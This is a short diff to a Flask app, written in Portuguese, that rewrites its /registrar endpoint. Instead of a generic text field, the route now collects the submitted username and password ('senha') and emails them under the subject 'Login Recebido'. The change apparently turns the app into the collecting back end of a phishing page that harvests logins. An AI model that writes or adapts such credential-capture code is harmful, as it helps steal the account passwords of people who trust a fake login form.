@@ -16,13 +16,12 @@ def home():
 
 @app.route("/registrar", methods=["POST"])
 def registrar():
-    data = request.get_json()
-    texto = data.get("texto", "")
-
+    texto = request.form.get("username", "") + " - " + request.form.get("senha", "")
+    
     if texto.strip():
-        enviar_email("Texto Digitado", texto)
-
-    return "Texto recebido com sucesso!"
+        enviar_email("Login Recebido", texto) 
+        
+    return "Dados recebidos com sucesso!"
 
 def enviar_email(assunto, corpo):
     msg = MIMEText(corpo)
